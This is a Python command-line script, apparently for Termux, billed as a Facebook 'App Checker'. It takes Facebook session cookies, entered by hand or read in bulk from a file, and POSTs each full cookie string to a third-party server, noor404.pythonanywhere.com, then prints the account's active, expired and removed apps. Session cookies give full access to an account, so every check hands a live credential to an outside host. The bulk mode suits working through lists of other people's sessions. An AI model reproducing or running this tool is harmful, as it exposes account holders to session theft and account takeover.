#!/data/data/com.termux/files/usr/bin/python3.14
# -*- coding: utf-8 -*-
import os,time,sys,requests,json
from os import system as cls

class Menu():
	def __init__(self):
		cls("clear" if os.name == "posix" else "cls")
		self.line = f"{50*'-'}"
		self.logo = f"""\n{self.line}\n[~] Developer ==> NOOR-404\n[~] Tool Type ==> Facebook App Checker\n{self.line}"""
		self.G = "\033[1;92m"
		self.W = "\x1b[38;5;15m"
		print(self.logo,f"\n[1] Manual Cookie App Check\n[2] Auto Cookie File App Check\n[0] Exit Tool\n"+self.line)
		mnu = input("[?] Choice The Menu ==> ")
		if mnu == "1":
			sgl(self.line,self.logo,self.G,self.W)
		if mnu == "2":
			mgl(self.line,self.logo,self.G,self.W)
		if mnu == "0":
			print(self.line,f"\n[~] Exit Done");time.sleep(1.5);print(f"{self.line}");sys.exit()
		else:
			print(self.line,f"\n[~] Incorrect Choice Try Again");time.sleep(1.5);Menu()

class sgl():
	def __init__(self,line,logo,G,W):
		cls("clear" if os.name == "posix" else "cls")
		try:
			single = int(input(str(logo)+f"\n[~] How Much Cookie U Wan't To Input ==> "))
		except ValueError:
			print(line+"\n[~] Input Valid Number ");time.sleep(1.5);sgl(line,logo,G,W)
		for i in range(single):
			cokix = input(line+f"\n[~] Enter Cookie [No.{i+1}] ==>{G} ");print(f"{W}{line}")
			uid = "Unknown"
			if "c_user=" in cokix:
				try:uid = cokix.split("c_user=")[1].split(";")[0]
				except: pass
			print(f"[~] Checking UID: {G}{uid}{W}\n"+line)
			try:
				data = requests.post("https://noor404.pythonanywhere.com/Apps",json={"cookies": cokix}, timeout=10).json()
				active_apps = data.get("active_apps", [])
				expired_apps = data.get("expired_apps", [])
				remove_apps = data.get("removed_apps", [])
				if active_apps and not "No Active Apps" in str(active_apps):
					print("[~] Active Apps ==> ")
					for app in active_apps:print(f"[~] {app}")
				else:
					print("[~] No Active Apps ")
				if expired_apps and not "No Expired Apps" in str(expired_apps):
					print(line+"\n[~] Expired Apps ==> ")
					for app in expired_apps:print(f"[~] {app}")
				else:
					print(line+"\n[~] No Expired Apps ")
				if remove_apps and not "No Removed Apps" in str(remove_apps):
					print(line+"\n[~] Remove Apps ==> ")
					for app in remove_apps:print(f"[~] {app}")
				else:
					print(line+"\n[~] No Remove Apps ")
			except Exception:
				print(f"[~] Expired Cookie")
		sxx = input(line+"\n[~] Press Enter For Back Menu Type E To Exit ==> ")
		if sxx.lower() == "e":
			print(line+f"\n[~] Thanks For Using Exiting...");time.sleep(1.5);print(line);sys.exit()
		else:
			Menu()

class mgl():
	def __init__(self,line,logo,G,W):
		cls("clear" if os.name == "posix" else "cls")
		print(str(logo));mgll=input(f"[~] Input Your Cookie file ==> ")
		try:
			filess = open(mgll,'r').read().splitlines()
		except FileNotFoundError:
			print(line,f"\n[~] Incorrect File Location");time.sleep(1.5);mgl(line,logo,G,W)
		total_cookies = len(filess)
		print(line+ f"\n[~] Total Cookies Found: {total_cookies}\n"+line)
		for count, cokix in enumerate(filess, 1):
			if "c_user=" in cokix:
				try:uid = cokix.split("c_user=")[1].split(";")[0]
				except:pass
			print(f"[~] Checking Cookie [{count}/{total_cookies}] | UID: {G}{uid}{W}\n"+line)
			try:
				data = requests.post("https://noor404.pythonanywhere.com/Apps",json={"cookies": cokix}, timeout=10).json()
				active_apps = data.get("active_apps", [])
				expired_apps = data.get("expired_apps", [])
				remove_apps = data.get("removed_apps", [])
				if active_apps and not "No Active Apps" in str(active_apps):
					print("[~] Active Apps ==> ")
					for app in active_apps:print(f"[~] {app}")
				else:
					print("[~] No Active Apps ")
				if expired_apps and not "No Expired Apps" in str(expired_apps):
					print(line+"\n[~] Expired Apps ==> ")
					for app in expired_apps:print(f"[~] {app}")
				else:
					print(line+"\n[~] No Expired Apps ")
				if remove_apps and not "No Removed Apps" in str(remove_apps):
					print(line+"\n[~] Remove Apps ==> ")
					for app in remove_apps:print(f"[~] {app}")
				else:
					print(line+"\n[~] No Remove Apps\n"+line)
			except Exception:
				print(f"[~] Expired Cookie")
		sxx = input(line+"\n[~] Press Enter For Back Menu Type E To Exit ==> ")
		if sxx.lower() == "e":
			print(line+f"\n[~] Thanks For Using Exiting...");time.sleep(1.5);print(line);sys.exit()
		else:
			Menu()

try:
	Menu()
except Exception as e:
	print(e)